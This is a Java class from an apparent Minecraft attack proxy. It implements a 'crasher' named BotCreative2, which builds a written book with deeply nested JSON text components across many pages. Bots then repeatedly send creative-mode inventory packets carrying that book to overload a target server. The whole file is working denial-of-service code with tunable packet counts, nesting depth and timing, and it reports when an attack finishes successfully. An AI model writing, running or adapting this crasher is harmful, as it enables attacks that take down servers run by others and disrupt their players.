package us.whitedev.proxy.functions.crashers.impl;

import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundSetCreativeModeSlotPacket;
import com.github.steveice10.opennbt.tag.builtin.ByteTag;
import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
import com.github.steveice10.opennbt.tag.builtin.ListTag;
import com.github.steveice10.opennbt.tag.builtin.StringTag;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import us.whitedev.proxy.functions.crashers.BotCrasher;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class BotCreative2 implements BotCrasher {
    private ScheduledExecutorService executorService;

    @Override
    public String getName() {
        return "BotCreative2";
    }

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[0]);
        int chars = Integer.parseInt(args[1]);
        int pages = Integer.parseInt(args[2]);
        long threadsleep = Long.parseLong(args[3]);
        int loopamount = Integer.parseInt(args[4]);

        msgHelper.sendMessage("Bots Starting crashing with &f" + getName(), true);

        StringBuilder s = new StringBuilder();
        s.append("{");
        s.append("extra:[{".repeat(Math.max(0, chars)));
        s.append("text:م}],".repeat(Math.max(0, chars)));
        s.append("text:م}");
        CompoundTag comp = new CompoundTag("tag");
        ListTag list = new ListTag("pages");
        for (int i = 0; i < pages; i++) list.add(new StringTag("page", s.toString()));
        comp.put(new StringTag("author", "GodIsKing"));
        comp.put(new ByteTag("resolver", (byte) 0));
        comp.put(list);
        ItemStack itemstack = new ItemStack(387, 1, comp);
        Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();

        for (int j = 0; j < 46; ++j) {
            int2objectmap.put(j, itemstack);
        }

        AtomicInteger check = new AtomicInteger(0);
        executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            for (int i = 0; i < packets; i++) {
                if (check.get() == loopamount) {
                    executorService.shutdown();
                    msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
                    break;
                }
                botsRep.sendPacket(new ServerboundSetCreativeModeSlotPacket(20, itemstack), true);
            }
            check.getAndIncrement();
        };
        executorService.scheduleAtFixedRate(clickTask, 0, threadsleep, TimeUnit.MILLISECONDS);
    }

    @Override
    public String[] getArgsName(){
        return new String[]{"Packets", "Chars", "Pages", "Thread Sleep", "Loop Amount"};
    }

    @Override
    public String[] getArgsType(){
        return new String[]{"int", "int", "int", "int", "int"};
    }


    @Override
    public String getDescription(){
        return "Simple NBT CreativeSlot Crasher [extra book]";
    }
}
